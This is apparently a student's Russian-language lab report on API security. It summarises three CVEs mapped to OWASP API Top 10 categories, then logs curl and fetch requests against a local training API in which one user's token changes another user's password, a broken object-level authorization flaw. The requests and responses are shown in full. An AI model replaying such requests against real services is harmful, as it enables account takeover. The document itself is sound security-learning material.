## Часть 1

### Ссылки на источники

#### 1. CVE-2025-9209 — RestroPress: Authentication Bypass через REST API
https://nvd.nist.gov/vuln/detail/CVE-2025-9209
**Источник:** NVD. Уязвимость опубликована 3 октября 2025 года. NVD пишет, что в RestroPress версии 3.0.0–3.1.9.2 через endpoint `/wp-json/wp/v2/users` раскрывались private tokens и API data, из-за чего неаутентифицированный атакующий мог подделать JWT-токены других пользователей, включая администратора, и войти от их имени.

**К какой категории OWASP относится:**  
https://owasp.org/API-Security/editions/2023/en/0xa2-broken-authentication/
Лучше всего это привязать к **API2:2023 — Broken Authentication**, потому что итогом становится обход аутентификации и захват чужой учетной записи. OWASP относит к API2 случаи, когда можно скомпрометировать токены или “assume other users’ identities”.

**В чем заключается недостаток:**  
REST API возвращал данные, которые нельзя было отдавать клиенту: приватные токены пользователя. Получив такой токен, атакующий мог сформировать валидный JWT и авторизоваться как другой пользователь.

**Причина недостатка:**  
Главная причина — **небезопасная реализация аутентификации и экспонирование чувствительных данных через API**. То есть проблема не просто в “утечке информации”, а в том, что через API наружу ушли данные, напрямую влияющие на механизм авторизации.

---

#### 2. CVE-2025-12030 — ACF to REST API: IDOR / Broken Object-Level Access
https://nvd.nist.gov/vuln/detail/CVE-2025-12030
**Источник:** NVD. Уязвимость опубликована 7 января 2026 года. В плагине ACF to REST API до версии 3.3.4 была уязвимость **Insecure Direct Object Reference**. NVD указывает, что в `update_item_permissions_check()` проверялось только общее право `edit_posts`, но не проверялись объектные права вроде `edit_post($id)`, `edit_user($id)` или `manage_options`.

**К какой категории OWASP относится:**  
https://owasp.org/API-Security/editions/2023/en/0xa5-broken-function-level-authorization/?utm_source=chatgpt.com
Это очень близко к **API1:2023 — Broken Object Level Authorization**. OWASP описывает API1 как ситуацию, когда API работает с идентификаторами объектов и не проверяет, имеет ли пользователь право на доступ именно к этому объекту.

**В чем заключается недостаток:**  
Атакующий с низкими правами мог обращаться к endpoint’ам вида `/wp-json/acf/v3/{type}/{id}` и изменять чужие сущности: посты, пользователей, комментарии, термы и даже глобальные настройки, если мог подобрать или указать нужный `id`.

**Причина недостатка:**  
Причина — **недостаточная проверка авторизации на уровне конкретного объекта**. Сервер проверял только общее наличие некой роли/способности, но не проверял, относится ли целевой объект именно этому пользователю и разрешено ли ему менять именно его.

---

#### 3. CVE-2025-14082 — Keycloak Admin REST API: Information Disclosure из-за слабой авторизации
https://nvd.nist.gov/vuln/detail/CVE-2025-14082?utm_source=chatgpt.com
**Источник:** NVD. Уязвимость опубликована 10 декабря 2025 года. В **Keycloak Admin REST API** через endpoint `/admin/realms/{realm}/roles` было возможно раскрытие чувствительных метаданных ролей из-за insufficient authorization checks. CWE указан как **CWE-284 Improper Access Control**.

**К какой категории OWASP относится:**  
Здесь логичнее всего указать **API5:2023 — Broken Function Level Authorization**. OWASP API5 описывает ситуации, когда пользователь может вызывать функции или административные endpoint’ы, к которым у него не должно быть доступа.

**В чем заключается недостаток:**  
Даже при наличии у атакующего только ограниченного доступа, endpoint административного REST API позволял получить метаданные ролей realm’а, которые не должны были быть доступны этому уровню пользователя.

**Причина недостатка:**  
Причина — **некорректная серверная проверка прав для административной функции API**. То есть endpoint существовал и был достижим, но разграничение ролей и прав для этой функции было реализовано неправильно.

## Часть 2

сначала просто тыкаю все ручки

100% надо проверить уязвимости связанные с авторизацией

не понял как правильно дерагть ручик мутации (post put delete), я просто через консоль браузера пишу запросы на js 
вот так
```js
fetch('/users/v1/register', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({
    username: 'testuser',
    password: '123456',
    email: 'test@example.com'
  })
})
.then(r => r.json())
.then(console.log)
.catch(console.error);
```

мой пользователь успешно зарегистрировался
try login

```js
fetch('/users/v1/login', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({
    username: 'testuser',
    password: '123456',
//    email: 'test@example.com'
  })
})
.then(r => r.json())
.then(console.log)
.catch(console.error);
```
response
```
{
    auth_token: "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3NzQxNjg5NzQsImlhdCI6MTc3NDE2ODkxNCwic3ViIjoidGVzdHVzZXIifQ.SeJo7q-aJUsCDqGo-udJqKdm6bizu9Wa2-jJN2R8yv8"
	message: "Successfully logged in."
	status: "success"
}
```

ну кстати возможно через курл удобней

BASE="http://localhost:8080"
попробую проверить API1: broken object level auth
регаю 2ух новых пользователей
```
curl -s -X POST "$BASE/users/v1/register" \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"alice123","email":"alice@example.com"}'
  
curl -s -X POST "$BASE/users/v1/register" \
  -H "Content-Type: application/json" \
  -d '{"username":"bob","password":"bob123","email":"bob@example.com"}'
```

логинюсь через alice
```
curl -s -X POST "$BASE/users/v1/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"alice123"}'
# и сохраняю ттокен

TOKEN="сюда_вставь_jwt_токен_alice"

curl -i -s "$BASE/users/v1/alice" \
  -H "Authorization: Bearer $TOKEN"
```

теперь с токеном alice пробую получить профиль боба - все успешно (юзенаме и почта)

теперь пробую изменять данные боба под токеном алисы

```
curl -i -s -X PUT "$BASE/users/v1/bob/email"   -H "Content-Type: application/json"   -H "Authorization: Bearer $TOKEN"   -d '{"email":"hacked_bob@example.com"}'
HTTP/1.0 401 UNAUTHORIZED
Content-Type: application/json
Content-Length: 73
Server: Werkzeug/1.0.1 Python/3.7.12
Date: Sun, 22 Mar 2026 08:54:35 GMT

{ "status": "fail", "message": "Signature expired. Please log in again."}

curl -i -s -X PUT "$BASE/users/v1/bob/password" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"password":"newbob123"}'
HTTP/1.0 401 UNAUTHORIZED
Content-Type: application/json
Content-Length: 73
Server: Werkzeug/1.0.1 Python/3.7.12
Date: Sun, 22 Mar 2026 08:55:16 GMT

{ "status": "fail", "message": "Signature expired. Please log in again."}

curl -i -s -X DELETE "$BASE/users/v1/bob" \
  -H "Authorization: Bearer $TOKEN"
HTTP/1.0 401 UNAUTHORIZED
Content-Type: application/json
Content-Length: 73
Server: Werkzeug/1.0.1 Python/3.7.12
Date: Sun, 22 Mar 2026 08:55:38 GMT

{ "status": "fail", "message": "Signature expired. Please log in again."}
```


```
curl -i -s "$BASE/users/v1/bob"   -H "Authorization: Bearer $TOKEN"
HTTP/1.0 200 OK
Content-Type: application/json
Content-Length: 47
Server: Werkzeug/1.0.1 Python/3.7.12
Date: Sun, 22 Mar 2026 09:02:28 GMT

{"username": "bob", "email": "bob@example.com"}
```
ничего не выходит, но пишет что токен истек, попробую заново залогиниться и быстро сделать все тоже самое

```
curl -s -X POST "$BASE/users/v1/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"alice123"}'
{"auth_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3NzQxNzAyNTMsImlhdCI6MTc3NDE3MDE5Mywic3ViIjoiYWxpY2UifQ.Qeox_yMpSscTmncS5xxF6SMDTh5EDQ_1Z6a6dWljKDk", "message": "Successfully logged in.", "status": "success"}

curl -i -s -X PUT "$BASE/users/v1/bob/email" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"email":"hacked_bob@example.com"}'
HTTP/1.0 204 NO CONTENT
Content-Type: application/json
Server: Werkzeug/1.0.1 Python/3.7.12
Date: Sun, 22 Mar 2026 09:03:31 GMT

curl -i -s -X PUT "$BASE/users/v1/bob/password" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"password":"newbob123"}'
HTTP/1.0 204 NO CONTENT
Content-Type: application/json
Server: Werkzeug/1.0.1 Python/3.7.12
Date: Sun, 22 Mar 2026 09:03:48 GMT

curl -i -s -X DELETE "$BASE/users/v1/bob" \
  -H "Authorization: Bearer $TOKEN"
HTTP/1.0 401 UNAUTHORIZED
Content-Type: application/json
Content-Length: 63
Server: Werkzeug/1.0.1 Python/3.7.12
Date: Sun, 22 Mar 2026 09:03:56 GMT

{ "status": "fail", "message": "Only Admins may delete users!"}
```

уже прилетаю 204, но удалить пользователя не получилось

проверяем получилось ли поменять email или password

```
curl -i -s "$BASE/users/v1/bob"   -H "Authorization: Bearer $TOKEN"
HTTP/1.0 200 OK
Content-Type: application/json
Content-Length: 47
Server: Werkzeug/1.0.1 Python/3.7.12
Date: Sun, 22 Mar 2026 09:05:15 GMT

{"username": "bob", "email": "bob@example.com"}
```

почта не поменялась

```
curl -i -s -X POST "$BASE/users/v1/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"bob","password":"newbob123"}'
HTTP/1.0 200 OK
Content-Type: application/json
Content-Length: 221
Server: Werkzeug/1.0.1 Python/3.7.12
Date: Sun, 22 Mar 2026 09:06:45 GMT

{"auth_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3NzQxNzA0NjUsImlhdCI6MTc3NDE3MDQwNSwic3ViIjoiYm9iIn0.xmect2NLLWVnKMBb75Y4rA8v8aJwHc1KNGuxm2ccebY", "message": "Successfully logged in.", "status": "success"}

curl -i -s -X POST "$BASE/users/v1/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"bob","password":"bob123"}'
HTTP/1.0 200 OK
Content-Type: application/json
Content-Length: 81
Server: Werkzeug/1.0.1 Python/3.7.12
Date: Sun, 22 Mar 2026 09:07:04 GMT

{ "status": "fail", "message": "Password is not correct for the 
```

а вот пароль поменялся, победа!

### Подведу итог
Подтвердилась уязвимость OWASP API1:2023 — Broken Object Level Authorization, потому что пользователь alice смог поменять пароль пользователя bob

Иными словами, сервер не проверяет, имеет ли текущий пользователь право на доступ/изменение именно этого объекта.

#### Как предотвратить?
  
Нужно на каждом запросе сравнивать:

- кто пользователь из токена;
- к какому объекту он обращается;
- имеет ли он право работать именно с этим объектом.

возможно проблема уже в том что alice получает email боба, но скорее всего на этом не надло было заострять внимание

